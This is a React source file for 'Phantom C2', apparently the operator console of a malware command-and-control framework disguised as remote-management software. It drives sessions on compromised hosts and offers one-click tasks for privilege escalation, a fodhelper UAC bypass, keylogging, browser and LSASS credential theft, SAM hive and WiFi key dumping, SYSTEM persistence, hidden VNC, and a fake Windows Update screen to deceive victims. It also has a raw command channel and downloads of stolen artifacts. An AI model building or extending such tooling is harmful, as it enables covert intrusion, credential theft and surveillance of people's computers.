"use client";

/**
 * Phantom C2 console — the offensive wing of MagicWand RMM.
 * Talks to /api/c2/* with a TOTP-gated operator JWT.
 */
import * as React from "react";

type Session = { id: string; hostname: string; username: string; os: string; privilege: string; status: string; proto: string; last_seen: string };
type Artifact = { id: string; name: string; kind: string; size: number; session_id: string; created_at: string };
type Toast = { id: number; text: string; kind: "ok" | "err" };

const TASKS = [
  { verb: "getsys", args: "auto", label: "⚡ Escalate → SYSTEM" },
  { verb: "uac", args: "", label: "UAC bypass (fodhelper)" },
  { verb: "worker", args: "", label: "Spawn desktop worker" },
  { verb: "screen", args: "", label: "Capture screen" },
  { verb: "keylog", args: "start", label: "Keylogger ON" },
  { verb: "keylog", args: "dump", label: "Keylogger dump" },
  { verb: "creds", args: "chrome", label: "Browser creds" },
  { verb: "creds", args: "lsass", label: "LSASS dump" },
  { verb: "creds", args: "wifi", label: "WiFi keys" },
  { verb: "creds", args: "hives", label: "SAM hives" },
  { verb: "persist", args: "task", label: "Persist · SYSTEM task" },
  { verb: "overlay", args: "start 10", label: "Fake Windows Update (10m)" },
  { verb: "overlay", args: "stop", label: "Hide update overlay" },
  { verb: "netrecon", args: "", label: "Network recon" },
  { verb: "ps", args: "", label: "Process list" },
  { verb: "hvnc", args: "start", label: "HVNC start" },
];

export default function PhantomPage() {
  const [token, setToken] = React.useState<string | null>(null);
  const [step1, setStep1] = React.useState<{ ticket: string; setup?: boolean; secret?: string } | null>(null);
  const [user, setUser] = React.useState("");
  const [pass, setPass] = React.useState("");
  const [code, setCode] = React.useState("");
  const [error, setError] = React.useState("");
  const [sessions, setSessions] = React.useState<Session[]>([]);
  const [selected, setSelected] = React.useState<string | null>(null);
  const [history, setHistory] = React.useState<Array<{ command: string; response: string; task_id?: string }>>([]);
  const [artifacts, setArtifacts] = React.useState<Artifact[]>([]);
  const [cmd, setCmd] = React.useState("");
  const [toasts, setToasts] = React.useState<Toast[]>([]);
  const seq = React.useRef(0);

  const toast = (text: string, kind: "ok" | "err" = "ok") => {
    const id = ++seq.current;
    setToasts((t) => [...t.slice(-3), { id, text, kind }]);
    setTimeout(() => setToasts((t) => t.filter((x) => x.id !== id)), 4000);
  };

  const authed = React.useCallback(async (p: string, pathSuffix: string) => {
    const r = await fetch(`/api/c2/${pathSuffix}`, {
      headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
    });
    return r;
  }, [token]);

  const refresh = React.useCallback(async () => {
    if (!token) return;
    try {
      const s = await (await authed(token, "sessions")).json();
      setSessions(Array.isArray(s) ? s : []);
      const a = await (await authed(token, "artifacts")).json();
      setArtifacts(Array.isArray(a) ? a : []);
      if (selected) {
        const h = await (await authed(token, `sessions/${selected}/history`)).json();
        setHistory(Array.isArray(h) ? h : []);
      }
    } catch { /* ignore */ }
  }, [token, selected, authed]);

  React.useEffect(() => {
    if (token) {
      void refresh();
      const t = setInterval(() => void refresh(), 8000);
      return () => clearInterval(t);
    }
  }, [token, refresh]);

  async function doLogin(e: React.FormEvent) {
    e.preventDefault();
    setError("");
    try {
      if (step1) {
        const r = await fetch("/api/c2/auth/totp", {
          method: "POST", headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ ticket: step1.ticket, code }),
        });
        const d = await r.json();
        if (!r.ok) throw new Error(d.error || "TOTP failed");
        setToken(d.token);
        toast("operator authenticated");
        return;
      }
      const r = await fetch("/api/c2/auth/login", {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username: user, password: pass }),
      });
      const d = await r.json();
      if (!r.ok) throw new Error(d.error || "login failed");
      if (d.totp_setup) { setStep1({ ticket: d.ticket, setup: true, secret: d.secret }); return; }
      if (d.totp_required) { setStep1({ ticket: d.ticket }); return; }
      throw new Error("unexpected response");
    } catch (ex) {
      setError(ex instanceof Error ? ex.message : String(ex));
    }
  }

  async function runTask(verb: string, args: string) {
    if (!selected || !token) return;
    const r = await fetch(`/api/c2/sessions/${selected}/task`, {
      method: "POST",
      headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
      body: JSON.stringify({ verb, args }),
    });
    const d = await r.json();
    toast(r.ok ? `task queued · ${verb}` : d.error || "task failed", r.ok ? "ok" : "err");
    void refresh();
  }

  async function sendCmd() {
    if (!selected || !token || !cmd.trim()) return;
    await fetch(`/api/c2/sessions/${selected}/command`, {
      method: "POST",
      headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
      body: JSON.stringify({ command: cmd }),
    });
    setCmd("");
    setTimeout(() => void refresh(), 2500);
  }

  const card = "rounded-xl border border-[#1c2635] bg-[#0e141d]";
  if (!token) {
    return (
      <div className="max-w-md mx-auto mt-10">
        <div className={`${card} p-6`}>
          <h2 className="text-lg font-bold text-[#2dd4bf] mb-1">Phantom C2 — operator login</h2>
          <p className="text-xs text-[#9fb0c4] mb-4">Password + authenticator code (TOTP). No code, no entry.</p>
          <form onSubmit={doLogin} className="flex flex-col gap-3">
            {!step1 && (
              <>
                <input className="rounded-lg bg-[#0b0e15] border border-[#1c2635] px-3 py-2 text-sm outline-none focus:border-[#14b8a6]" placeholder="operator" value={user} onChange={(e) => setUser(e.target.value)} />
                <input type="password" className="rounded-lg bg-[#0b0e15] border border-[#1c2635] px-3 py-2 text-sm outline-none focus:border-[#14b8a6]" placeholder="password" value={pass} onChange={(e) => setPass(e.target.value)} />
              </>
            )}
            {step1?.setup && step1.secret && (
              <div className="rounded-lg border border-[rgba(45,212,191,0.4)] bg-[rgba(45,212,191,0.06)] p-3">
                <div className="text-xs font-bold text-[#2dd4bf] mb-1">Enroll your authenticator — shown once:</div>
                <code className="block text-[13px] tracking-wider text-[#5eead4] bg-[#05070b] rounded p-2 break-all">{step1.secret}</code>
              </div>
            )}
            {step1 && (
              <input inputMode="numeric" maxLength={6} className="rounded-lg bg-[#0b0e15] border border-[#1c2635] px-3 py-2 text-sm outline-none focus:border-[#14b8a6] tracking-[0.3em] text-center" placeholder="000000" value={code} onChange={(e) => setCode(e.target.value)} />
            )}
            {error && <div className="text-xs text-[#f87171]">{error}</div>}
            <button type="submit" className="rounded-lg bg-[#14b8a6] hover:bg-[#2dd4bf] text-[#04211d] font-bold py-2 text-sm">Authenticate</button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="flex flex-col gap-5">
      <div className="flex items-center justify-between">
        <h2 className="text-lg font-bold">Phantom <span className="text-[#2dd4bf]">C2</span> <span className="text-xs text-[#6d7f95] font-normal">task protocol · TOTP-gated</span></h2>
        <button className="text-xs text-[#6d7f95] hover:text-[#f87171]" onClick={() => { setToken(null); setStep1(null); }}>lock console</button>
      </div>

      <div className={card}>
        <div className="px-4 py-3 border-b border-[#1c2635] text-xs font-bold text-[#9fb0c4] uppercase tracking-wider">Sessions</div>
        <div className="divide-y divide-[#1c2635]">
          {sessions.length === 0 && <div className="px-4 py-6 text-sm text-[#6d7f95]">No agents connected — build a payload and run it.</div>}
          {sessions.map((s) => (
            <button key={s.id} className={`w-full text-left px-4 py-3 hover:bg-[#121a25] ${selected === s.id ? "bg-[#121a25]" : ""}`} onClick={() => { setSelected(s.id); setHistory([]); }}>
              <div className="flex items-center justify-between">
                <span className="font-semibold text-sm">{s.hostname || s.id}</span>
                <span className={`text-[10px] px-2 py-0.5 rounded-full border ${s.status === "active" ? "text-[#34d399] border-[#34d39944]" : "text-[#6d7f95] border-[#1c2635]"}`}>{s.status}</span>
              </div>
              <div className="text-[11px] text-[#6d7f95]">{s.username} · {s.os} · {s.privilege} · {s.proto}</div>
            </button>
          ))}
        </div>
      </div>

      {selected && (
        <>
          <div className={card + " p-4"}>
            <div className="text-xs font-bold text-[#9fb0c4] uppercase tracking-wider mb-2">Offensive tasks</div>
            <div className="flex flex-wrap gap-1.5">
              {TASKS.map((t) => (
                <button key={t.label} className="text-[11px] px-2.5 py-1 rounded-lg border border-[#253347] text-[#9fb0c4] hover:text-[#2dd4bf] hover:border-[#14b8a6]" onClick={() => void runTask(t.verb, t.args)}>{t.label}</button>
              ))}
            </div>
            <div className="flex gap-2 mt-3">
              <input id="c2-verb" className="w-40 rounded-lg bg-[#0b0e15] border border-[#1c2635] px-3 py-1.5 text-xs font-mono" placeholder="verb" />
              <input id="c2-args" className="flex-1 rounded-lg bg-[#0b0e15] border border-[#1c2635] px-3 py-1.5 text-xs" placeholder="args…" onKeyDown={(e) => { if (e.key === "Enter") { const v = (document.getElementById("c2-verb") as HTMLInputElement).value.trim(); const a = (document.getElementById("c2-args") as HTMLInputElement).value; if (v) void runTask(v, a); } }} />
              <button className="rounded-lg bg-[#14b8a6] text-[#04211d] text-xs font-bold px-3" onClick={() => { const v = (document.getElementById("c2-verb") as HTMLInputElement).value.trim(); const a = (document.getElementById("c2-args") as HTMLInputElement).value; if (v) void runTask(v, a); }}>Run</button>
            </div>
          </div>

          <div className={card}>
            <div className="px-4 py-3 border-b border-[#1c2635] text-xs font-bold text-[#9fb0c4] uppercase tracking-wider">History</div>
            <div className="max-h-80 overflow-auto divide-y divide-[#1c2635]">
              {history.length === 0 && <div className="px-4 py-4 text-xs text-[#6d7f95]">No activity yet.</div>}
              {history.slice().reverse().map((h, i) => (
                <div key={i} className="px-4 py-2">
                  <div className="text-xs font-mono text-[#5eead4]">{h.command}{h.task_id ? ` · ${h.task_id.slice(0, 12)}` : ""}</div>
                  <div className="text-[11px] text-[#9fb0c4] whitespace-pre-wrap font-mono max-h-40 overflow-auto">{(h.response || "").slice(0, 2000)}</div>
                </div>
              ))}
            </div>
          </div>
        </>
      )}

      <div className={card}>
        <div className="px-4 py-3 border-b border-[#1c2635] text-xs font-bold text-[#9fb0c4] uppercase tracking-wider">Artifacts</div>
        <div className="divide-y divide-[#1c2635]">
          {artifacts.length === 0 && <div className="px-4 py-4 text-xs text-[#6d7f95]">Nothing collected yet.</div>}
          {artifacts.map((a) => (
            <div key={a.id} className="px-4 py-2 flex items-center justify-between text-xs">
              <span className="font-mono">{a.name}</span>
              <span className="text-[#6d7f95]">{a.kind} · {a.size} B · <a className="text-[#2dd4bf] hover:underline" href={`/api/c2/artifacts/${a.id}/download?token=${token}`} download>download</a></span>
            </div>
          ))}
        </div>
      </div>

      <div className="fixed bottom-4 right-4 flex flex-col gap-2 z-50">
        {toasts.map((t) => (
          <div key={t.id} className={`px-3 py-2 rounded-lg text-xs shadow-xl border ${t.kind === "ok" ? "bg-[#0b1512] border-[#2dd4bf66] text-[#7ef0dd]" : "bg-[#170d0d] border-[#f8717166] text-[#fca5a5]"}`}>{t.text}</div>
        ))}
      </div>
    </div>
  );
}
